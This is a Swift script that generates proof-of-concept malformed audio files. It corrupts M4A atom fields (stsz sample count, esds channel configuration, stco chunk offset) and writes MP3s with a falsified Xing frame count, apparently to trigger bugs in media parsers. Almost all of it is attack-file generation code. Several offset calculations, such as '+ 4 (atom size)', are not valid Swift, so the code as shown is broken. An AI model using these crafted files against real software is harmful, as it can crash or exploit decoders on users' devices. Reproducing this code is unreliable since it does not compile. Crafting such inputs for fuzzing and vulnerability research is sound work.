import Foundation
import AVFoundation
import CoreMedia

// Helper to parse and modify MP4 atoms for M4A files
class MP4AtomParser {
    var data: Data
    var position: Int = 0
    
    init(data: Data) {
        self.data = data
    }
    
    func readUInt32() -> UInt32 {
        guard position + 4 <= data.count else { return 0 }
        let value = data[position..<position+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
        position += 4
        return value
    }
    
    func readData(count: Int) -> Data {
        guard position + count <= data.count else { return Data() }
        let subdata = data[position..<position+count]
        position += count
        return subdata
    }
    
    func findAtom(_ name: String) -> (offset: Int, size: Int)? {
        let nameData = name.data(using: .ascii)!
        position = 0
        while position < data.count {
            let start = position
            let sizeValue = readUInt32()
            let size = Int(sizeValue)
            // Handle atom size of 1 (extended size) or 0 (extends to end of file) if necessary,
            // though for typical stsz, esds, stco, this basic parsing is often sufficient.
            if sizeValue == 0 && start + 8 >= data.count { // Atom runs to end of file, or invalid
                 if start + 8 == data.count { return nil } // Avoid reading past end if it's just header
            }
            guard size >= 8 || sizeValue == 0 else { // Minimum atom size is 8 (size + type)
                // Or handle size == 1 (extended 64-bit size) if needed by your M4A files
                // For this example, assume invalid atom if size is too small and not 0
                return nil // Or throw an error
            }

            let type = readData(count: 4)
            if type == nameData {
                return (offset: start, size: size)
            }
            
            if sizeValue == 0 { // Atom extends to the end of the file
                 position = data.count
            } else {
                 position = start + size
            }

            if position > data.count || size <= 0 { // Basic sanity check
                break
            }
        }
        return nil
    }
    
    func replaceData(at offset: Int, with newData: Data) {
        // Ensure replacement does not go out of bounds, especially if new data is larger
        // and the atom structure implies fixed offsets for subsequent fields.
        // This simple replacement assumes newData is the same size or fits.
        data.replaceSubrange(offset..<offset+newData.count, with: newData)
    }
}

// PoC 1: Inflate stsz sample count to 8192
func manipulatePoC1(inputURL: URL, outputURL: URL) throws {
    var data = try Data(contentsOf: inputURL) // Make mutable
    let parser = MP4AtomParser(data: data)
    
    guard let stsz = parser.findAtom("stsz") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stsz atom not found"])
    }
    
    // stsz atom structure: version (1 byte), flags (3 bytes), sample_size (4 bytes), sample_count (4 bytes)
    // If sample_size is 0, then there's a table of sample sizes.
    // We are targeting 'number_of_entries' (sample_count) which is after 'sample_size'.
    let sampleCountOffset = stsz.offset + 4 (atom size) + 4 (atom type) + 4 /*version_flags*/ + 4 /*sample_size*/
    var newCountData = Data()
    newCountData.append(contentsOf: UInt32(8192).bigEndian.data) // UInt32 takes 4 bytes
    
    if sampleCountOffset + newCountData.count <= data.count && sampleCountOffset + newCountData.count <= stsz.offset + stsz.size {
         data.replaceSubrange(sampleCountOffset..<sampleCountOffset+newCountData.count, with: newCountData)
    } else {
        throw NSError(domain: "MP4PoC1", code: -2, userInfo: [NSLocalizedDescriptionKey: "stsz atom sample_count offset out of bounds."])
    }
    
    try data.write(to: outputURL)
    print("PoC 1: Set stsz sample count to 8192 in \(outputURL.path)")
}

// PoC 2: Set esds channel count to 8
func manipulatePoC2(inputURL: URL, outputURL: URL) throws {
    var data = try Data(contentsOf: inputURL) // Make mutable
    let parser = MP4AtomParser(data: data)
    
    guard let esds = parser.findAtom("esds") else {
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "esds atom not found"])
    }
    
    // The offset 0x1B within the esds atom data (after size and type) is an approximation.
    // Real ESDS parsing is complex (descriptor based). This is a targeted heuristic.
    // esds atom data starts after the 8 bytes of size and type.
    let esdsDataOffset = esds.offset + 8
    let channelConfigHeuristicOffset = esdsDataOffset + 0x1B // Offset within the ESDS *payload*
    
    if channelConfigHeuristicOffset < data.count && channelConfigHeuristicOffset < esds.offset + esds.size {
        data.replaceSubrange(channelConfigHeuristicOffset..<channelConfigHeuristicOffset+1, with: Data([8]))
    } else {
         throw NSError(domain: "MP4PoC2", code: -2, userInfo: [NSLocalizedDescriptionKey: "esds atom channel configuration offset out of bounds."])
    }
    
    try data.write(to: outputURL)
    print("PoC 2: Set esds channel count to 8 in \(outputURL.path)")
}

// PoC 5: Set invalid stco offset to 0xFFFFFFFF
func manipulatePoC5(inputURL: URL, outputURL: URL) throws {
    var data = try Data(contentsOf: inputURL) // Make mutable
    let parser = MP4AtomParser(data: data)
    
    guard let stco = parser.findAtom("stco") else { // Or co64 for 64-bit offsets
        throw NSError(domain: "MP4", code: -1, userInfo: [NSLocalizedDescriptionKey: "stco atom not found"])
    }
    
    // stco atom structure: version (1), flags (3), entry_count (4), then entries.
    // We'll try to overwrite the first chunk_offset entry.
    let firstEntryOffset = stco.offset + 4 (atom size) + 4 (atom type) + 4 /*version_flags*/ + 4 /*entry_count*/
    var newData = Data()
    newData.append(contentsOf: UInt32(0xFFFFFFFF).bigEndian.data)
    
    // Check if there's at least one entry to overwrite
    parser.position = stco.offset + 4 + 4 + 4 // Move to entry_count
    let entryCount = parser.readUInt32()
    if entryCount > 0 {
        if firstEntryOffset + newData.count <= data.count && firstEntryOffset + newData.count <= stco.offset + stco.size {
            data.replaceSubrange(firstEntryOffset..<firstEntryOffset+newData.count, with: newData)
        } else {
             throw NSError(domain: "MP4PoC5", code: -2, userInfo: [NSLocalizedDescriptionKey: "stco atom first entry offset out of bounds for replacement."])
        }
    } else {
        print("PoC 5: stco atom has no entries, skipping offset manipulation.")
        // Optionally, still write the data if no change is also acceptable, or throw.
        // For this PoC, if there are no entries, an invalid offset doesn't apply in the same way.
        // We'll just write the original data back or copy the file.
        if inputURL != outputURL { try FileManager.default.copyItem(at: inputURL, to: outputURL) }
        print("PoC 5: Skipped stco offset manipulation as no entries found in \(outputURL.path)")
        return // Exit early if no modification is made
    }
    
    try data.write(to: outputURL)
    print("PoC 5: Set first stco chunk_offset to 0xFFFFFFFF in \(outputURL.path)")
}


// Generate MP3 files independently using AVAssetWriter
func generateMP3(filename: String, duration: Double, channels: Int, sampleRate: Double, pocNumber: Int) throws {
    let outputURL = URL(fileURLWithPath: filename)
    let frameCount = AVAudioFrameCount(duration * sampleRate)

    // 1. Define the LPCM format of the *input* to the encoder.
    //    MP3 encoders typically want interleaved LPCM.
    guard let pcmFormat = AVAudioFormat(commonFormat: .pcmFormatFloat32,
                                        sampleRate: sampleRate,
                                        channels: AVAudioChannelCount(channels),
                                        interleaved: true) else {
        throw NSError(domain: "AudioFormat", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create PCM AVAudioFormat"])
    }

    guard let buffer = AVAudioPCMBuffer(pcmFormat: pcmFormat, frameCapacity: frameCount) else {
        throw NSError(domain: "AudioBuffer", code: -1, userInfo: [NSLocalizedDescriptionKey: "Failed to create AVAudioPCMBuffer"])
    }
    buffer.frameLength = frameCount // Crucial to set frameLength

    // Fill buffer with silence (zeros).
    if pcmFormat.isInterleaved {
        if let data = buffer.audioBufferList.pointee.mBuffers.mData {
            memset(data, 0, Int(buffer.audioBufferList.pointee.mBuffers.mDataByteSize))
        } else {
             throw NSError(domain: "AudioBuffer", code: -2, userInfo: [NSLocalizedDescriptionKey: "PCM buffer mData is nil for interleaved silenced fill."])
        }
    } else { // Non-interleaved (should not happen with interleaved: true)
        if let floatData = buffer.floatChannelData { // floatChannelData is for non-interleaved
            for channelIdx in 0..<Int(pcmFormat.channelCount) {
                 if let channelPtr = floatData[channelIdx] {
                    memset(channelPtr, 0, Int(frameCount) * MemoryLayout<Float>.size)
                 } else {
                     throw NSError(domain: "AudioBuffer", code: -3, userInfo: [NSLocalizedDescriptionKey: "PCM buffer floatChannelData[\(channelIdx)] is nil for non-interleaved silenced fill."])
                 }
            }
        } else {
            throw NSError(domain: "AudioBuffer", code: -4, userInfo: [NSLocalizedDescriptionKey: "PCM buffer floatChannelData is nil for non-interleaved silenced fill."])
        }
    }

    // 2. Define the MP3 output settings for the AVAssetWriterInput
    let bitrate = pocNumber == 4 ? 320000 : 128000
    let outputSettings: [String: Any] = [
        AVFormatIDKey: kAudioFormatMPEG3, // CORRECTED: Output is MP3
        AVSampleRateKey: sampleRate,
        AVNumberOfChannelsKey: channels,
        AVEncoderBitRateKey: bitrate,
        AVEncoderAudioQualityKey: AVAudioQuality.medium.rawValue // Optional: .min, .low, .medium, .high, .max
    ]
    
    let audioInput = AVAssetWriterInput(mediaType: .audio, outputSettings: outputSettings, sourceFormatHint: pcmFormat.formatDescription)
    audioInput.expectsMediaDataInRealTime = false // Good for file-based generation

    let writer = try AVAssetWriter(outputURL: outputURL, fileType: .mp3)
    guard writer.canAdd(audioInput) else {
        throw NSError(domain: "AVAssetWriter", code: -5, userInfo: [NSLocalizedDescriptionKey: "Cannot add audio input to writer"])
    }
    writer.add(audioInput)
    
    guard writer.startWriting() else {
        throw NSError(domain: "AVAssetWriter", code: -6, userInfo: [NSLocalizedDescriptionKey: "Failed to start writing. Error: \(writer.error?.localizedDescription ?? "Unknown")"])
    }
    writer.startSession(atSourceTime: .zero)

    // 3. Create CMSampleBuffer from the AVAudioPCMBuffer
    var sampleBuffer: CMSampleBuffer?
    
    let audioBuffer = buffer.audioBufferList.pointee.mBuffers
    guard let mData = audioBuffer.mData else {
        throw NSError(domain: "AudioBufferData", code: -7, userInfo: [NSLocalizedDescriptionKey: "PCM buffer mData is nil before creating CMBlockBuffer"])
    }

    var blockBuffer: CMBlockBuffer?
    // Create a CMBlockBuffer that *copies* the data from the AVAudioPCMBuffer's mData.
    var status = CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault,
                                       memoryBlock: mData, // Source data
                                       blockLength: Int(audioBuffer.mDataByteSize),
                                       blockAllocator: kCFAllocatorNull, // memoryBlock is managed elsewhere (by AVAudioPCMBuffer)
                                       customBlockSource: nil,
                                       offsetToData: 0,
                                       dataLength: Int(audioBuffer.mDataByteSize),
                                       flags: kCMBlockBufferAssureMemoryNowFlag, // Ensure memory is allocated and ready
                                       blockBufferOut: &blockBuffer)

    guard status == kCMBlockBufferNoErr, let createdBlockBuffer = blockBuffer else {
        throw NSError(domain: "CMBlockBuffer", code: Int(status), userInfo: [NSLocalizedDescriptionKey: "Failed to create CMBlockBuffer. OSStatus: \(status)"])
    }

    var timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: AVAudioRate(sampleRate)), // Duration of one PCM frame
                                  presentationTimeStamp: .zero,
                                  decodeTimeStamp: .invalid)

    status = CMSampleBufferCreate(allocator: kCFAllocatorDefault,
                         dataBuffer: createdBlockBuffer,
                         dataReady: true,
                         makeDataReadyCallback: nil,
                         refcon: nil,
                         formatDescription: pcmFormat.formatDescription, // Format of the LPCM data
                         sampleCount: CMItemCount(frameCount), // Number of PCM frames in this buffer
                         sampleTimingEntryCount: 1,
                         sampleTimingArray: &timing,
                         sampleSizeEntryCount: 0,
                         sampleSizeArray: nil,
                         sampleBufferOut: &sampleBuffer)

    guard status == noErr, let createdSampleBuffer = sampleBuffer else {
        throw NSError(domain: "CMSampleBuffer", code: Int(status), userInfo: [NSLocalizedDescriptionKey: "Failed to create CMSampleBuffer. OSStatus: \(status)"])
    }

    guard audioInput.isReadyForMoreMediaData else {
         throw NSError(domain: "AVAssetWriterInput", code: -8, userInfo: [NSLocalizedDescriptionKey: "Audio input not ready for more data initially."])
    }
    
    audioInput.append(createdSampleBuffer)
    audioInput.markAsFinished()

    let semaphore = DispatchSemaphore(value: 0)
    writer.finishWriting {
        if let error = writer.error {
            print("Error during finishWriting: \(error.localizedDescription)")
        }
        semaphore.signal()
    }
    
    let waitResult = semaphore.wait(timeout: .now() + 30.0) // Wait up to 30 seconds
    if waitResult == .timedOut {
        writer.cancelWriting() // Cancel if timed out
        throw NSError(domain: "AVAssetWriter", code: -9, userInfo: [NSLocalizedDescriptionKey: "MP3 generation timed out."])
    }

    if writer.status == .failed {
        throw writer.error ?? NSError(domain: "AVAssetWriter", code: Int(writer.status.rawValue), userInfo: [NSLocalizedDescriptionKey: "Writer failed. Status: \(writer.status.rawValue)"])
    } else if writer.status == .completed {
        print("PoC \(pocNumber): Generated MP3 at \(outputURL.path)")
    } else {
        print("Warning: Writer finished with status: \(writer.status.rawValue) for \(outputURL.path)")
    }
    
    // PoC 3: Add Xing frames=20000 metadata
    if pocNumber == 3 {
        var mp3Data = try Data(contentsOf: outputURL)
        let xingTag = "Xing".data(using: .ascii)! // Also "Info" for LAME CBR
        if let range = mp3Data.range(of: xingTag, options: [], in: 0..<min(mp3Data.count, 2048)) { // Search in typical header area
            // Xing/Info header structure: Tag (4 bytes), Flags (4 bytes), Frames (4 bytes if present)
            let flagsOffset = range.upperBound
            guard mp3Data.count >= flagsOffset + 4 else {
                 print("Warning: PoC 3 - Not enough data for Xing flags in \(filename)."); return
            }
            let flags = mp3Data[flagsOffset..<flagsOffset+4].withUnsafeBytes { $0.load(as: UInt32.self).bigEndian }
            
            var frameCountOffset = flagsOffset + 4 // Offset after flags
            let FRAMES_FLAG: UInt32 = 0x00000001 // Frames field is present
            
            if (flags & FRAMES_FLAG) != 0 { // Check if Frames field is indicated by flags
                 guard mp3Data.count >= frameCountOffset + 4 else {
                    print("Warning: PoC 3 - Not enough data for Xing frames count in \(filename)."); return
                }
                let frameCountData = UInt32(20000).bigEndian.data
                mp3Data.replaceSubrange(frameCountOffset..<frameCountOffset+4, with: frameCountData)
                try mp3Data.write(to: outputURL)
                print("PoC 3: Set Xing frames to 20000 in \(filename)")
            } else {
                print("Warning: Xing tag found in \(filename) for PoC 3, but FRAMES flag not set. Cannot write frame count.")
            }
        } else {
            print("Warning: Xing tag not found in \(filename) for PoC 3, skipping frames=20000 modification.")
        }
    }
}

extension UInt32 {
    var data: Data { // Already existed, seems fine
        var value = self.bigEndian
        return Data(bytes: &value, count: MemoryLayout<UInt32>.size)
    }
}

func main() {
    let fileManager = FileManager.default
    // Use these as defaults or for logic if needed
    let defaultSampleRate = 44100.0
    let defaultChannels = 1 // Most PoCs generate mono MP3

    for i in 1...5 {
        let inputFile = "base_poc\(i).m4a"
        let outputM4A = "poc\(i).m4a"
        let outputMP3 = "poc\(i).mp3"
        
        // Clean up old files if they exist
        try? fileManager.removeItem(atPath: outputM4A)
        try? fileManager.removeItem(atPath: outputMP3)
        
        guard fileManager.fileExists(atPath: inputFile) else {
            print("Error: \(inputFile) not found. Please create dummy base_poc files.")
            // Example: Create dummy M4A files for testing
            // You would need a valid minimal M4A file structure for this.
            // For now, we just exit.
            exit(1)
        }
        
        let inputURL = URL(fileURLWithPath: inputFile)
        let outputM4AURL = URL(fileURLWithPath: outputM4A)
        // outputMP3URL is created inside generateMP3

        do {
            // Generate M4A
            switch i {
            case 1:
                try manipulatePoC1(inputURL: inputURL, outputURL: outputM4AURL)
            case 2:
                try manipulatePoC2(inputURL: inputURL, outputURL: outputM4AURL)
            case 3, 4: // PoC 3 and 4 M4As are direct copies
                try fileManager.copyItem(at: inputURL, to: outputM4AURL)
                print("PoC \(i): Copied \(inputFile) to \(outputM4A) (M4A manipulation not applicable or done via MP3)")
            case 5:
                try manipulatePoC5(inputURL: inputURL, outputURL: outputM4AURL)
            default:
                break
            }
            
            // Determine MP3 parameters based on PoC
            var mp3Channels = defaultChannels
            // If PoC 2's M4A manipulation (8 channels) should also reflect in the MP3:
            // if i == 2 { mp3Channels = 8 } 
            // However, the current PoC description doesn't specify this for the MP3.
            // We'll stick to defaultChannels unless a PoC explicitly redefines MP3 params.

            // Generate MP3 independently
            try generateMP3(filename: outputMP3,
                            duration: 1.0, // 1 second of silence
                            channels: mp3Channels,
                            sampleRate: defaultSampleRate,
                            pocNumber: i)
            
        } catch {
            print("Error processing PoC \(i): \(error.localizedDescription)")
            // Consider whether to exit or continue with other PoCs
            // exit(1) // Uncomment to stop on first error
        }
        print("--- Completed PoC \(i) ---")
    }
    print("All PoCs processed.")
}

main()
